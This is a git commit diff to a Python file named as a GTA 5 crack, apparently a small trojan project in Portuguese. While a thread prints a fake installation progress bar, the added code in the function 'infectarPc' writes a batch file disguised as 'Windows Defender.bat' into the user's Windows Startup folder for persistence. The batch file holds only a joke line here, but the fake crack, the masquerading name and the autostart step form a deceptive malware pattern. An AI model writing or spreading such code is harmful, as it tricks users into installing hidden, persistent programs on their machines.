dc420e8819b9a61a9441ff203e54369270ccae9a
renantescaro <renantescaro@yahoo.com.br>
2019-08-20 22:10:07 -0300

    bat na inicializacao

--- crack_gta_5/inicial.py
+++ crack_gta_5/inicial.py
@@ -13,13 +13,24 @@ def msgInstalacao():
         print(str(x) + "%")
         time.sleep(.500)
 
+def criarBatInicializacao():
+        with open(os.path.expanduser("~") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows Defender.bat", "w") as arq:
+                arq.write("Oi sumida rsrs")
+                arq.write("\n")
+                arq.close()
+
+def navegarPastas():
+        dir = os.path.dirname(os.path.realpath(__file__))
+        print(dir)
+
 def infectarPc():
-    dir = os.path.dirname(os.path.realpath(__file__))
+        criarBatInicializacao()
+        navegarPastas()
 
 t = threading.Thread(target=msgInstalacao)
 t.start()
 
-while t.isAlive():
+if t.isAlive():
     infectarPc()
 
 
